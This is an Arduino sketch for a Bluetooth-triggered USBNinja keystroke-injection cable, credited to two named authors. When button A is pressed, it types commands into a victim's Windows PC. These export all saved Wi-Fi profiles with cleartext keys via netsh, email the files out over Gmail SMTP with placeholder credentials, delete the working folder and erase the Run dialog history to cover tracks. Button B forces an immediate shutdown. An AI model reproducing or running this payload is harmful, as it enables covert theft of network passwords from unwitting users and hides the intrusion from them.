#define LAYOUT_DANISH  //Keyboard layout set to Danish - Change this if necessary.
#include <NinjaKeyboard.h>

/* 
 *  Code by: Thomas Ilum Andersen and Jakob Lykke.
 */


/*https://www.usbninja.com/
This is the Code of Using Bluetooth remote control triggers Ninja to go
online, and act as a keyboard output characters.

payloadA() {}
When the Bluetooth remote control button A is pressed. 
The program in payloadA() will be executed in a loop. 
Until the button A is released.

payloadB() {}
When the Bluetooth remote control button B is pressed. 
The program in payloadB() will be executed in a loop. 
Until the button B is released.

setup() and loop() don't need to do anything.
  
*/

void setup() 
{
  //SetRunOnce(PAYLOADA,true);
  //SetRunOnce(PAYLOADB,true);
  //If you want payload to run only once, run this function.  
} 
                //
void loop() {}

/*
When the Bluetooth remote control button A is pressed. 
The program in payloadA() will be executed in a loop. 
Until the button A is released.
*/

void payloadA() {
    
    USBninjaOnline(); // USBNinja appears.  The cable's data
                        //line was temporarily cut off.
	/*
	You should call NinjaKeyboard.begin() after you call 
	NinjaKeyboard.end()
	Or, the NinjaKeyboard was disconnected and any action was not usable.
	*/
	  NinjaKeyboard.begin();     //Initliaze NinjaKeyboard USB Interface.
    NinjaKeyboard.delay(1000);     //Delay 1 sec to compatibility Win7,
                        //Some systems require 5 sec of preparation time.
    NinjaKeyboard.sendKeyStroke(0);//Send HID '0' to compatibility Win7.
    NinjaKeyboard.delay(1000);     //Delay 1 second to wait system.
                                     //Recognize the NinjaKeyboard.
    /*If you write a long string, you should use function F("") to include 
    your string. Due to the Ninja`s RAM was only 512Byte, this function 
    can write the string to Flash, and read it once a char to decrease 
    the available memory. 
	  If you do not use this function, the string may load to RAM while
	  the program start. The RAM use Bigger than 488Byte will cause
	  runtime error. 
	  print() will write the string without Enter Key, 
	  println() will write the string with Enter Key.
	  */
/*
    [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
screenshot $bounds "Snotbold.png"
*/
    // Get WIFI
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("cmd"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("mkdir WIFI"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("cd WIFI"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("netsh wlan export profile key=clear >nul"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("exit"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    //Send Email
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("powershell"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("cd WIFI"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$EmailFrom = '<examplemail@gmail.com>'"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$EmailTo = '<examplemail@gmail.com>'"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$Subject = 'Oplader_flex'"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$Body = Get-Content -Path *.xml | Out-String"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$SMTPClient.EnableSsl = $true"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('<examplemail@gmail.com>', '<ExamplePassword>');"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    // Remove WIFI dir
    NinjaKeyboard.delay(999);
    NinjaKeyboard.print(F("exit"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(200);
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("cmd"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(200);
    NinjaKeyboard.print(F("rmdir /S nonemptydir WIFI"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(200);
    NinjaKeyboard.print(F("y"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(200);
    NinjaKeyboard.print(F("y"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    // Clear run history
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\"));
    NinjaKeyboard.delay(200);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("yes"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.print(F("exit"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    
	/*
	While your cable connect to Some Phone, Only switch USB DATA was 
	not enough. The PC was still think that your phone was Ninja 
	(Your Phone Not send USB ReEmulate command), it may cause 
	non-stoppable input or NinjaKeyboard Device still Retain in your system.
	*/
  /*
  	NinjaKeyboard.end();          //Send Disconnect command to
  	                                //NinjaKeyboard USB Interface	
    USBninjaOffline();  //USBNinja disappear. Cable Line back to normal.
  	NinjaKeyboard.begin();  //ReStart Keyboard Interface while USB DATA
  	                        //was cut off. So you can use payloadB without 
							//ReEmulate NinjaKeyboard.
  */
}

/*
When the Bluetooth remote control button B is pressed. 
The program in payloadB() will be executed in a loop. 
Until the button B is released.
*/

void payloadB() {
    USBninjaOnline();  // USBNinja appears.  
                         //The cable's data line was temporarily cut off.
    NinjaKeyboard.sendKeyStroke(0); //Send HID '0' to compatibility Win7.
    /*If you write a long string, you should use function F("") to include 
    your string. Due to the Ninja`s RAM was only 512Byte, this function 
    can write the string to Flash, and read it once a char to decrease 
    the available memory. 
    If you do not use this function, the string may load to RAM while
    the program start. The RAM use Bigger than 488Byte will cause
    runtime error. 
    print() will write the string without Enter Key, notepad
    println() will write the string with Enter Key.
    */
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
    NinjaKeyboard.delay(300);
    NinjaKeyboard.print(F("shutdown /s /t 0")); 
    NinjaKeyboard.delay(300);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
                              
}
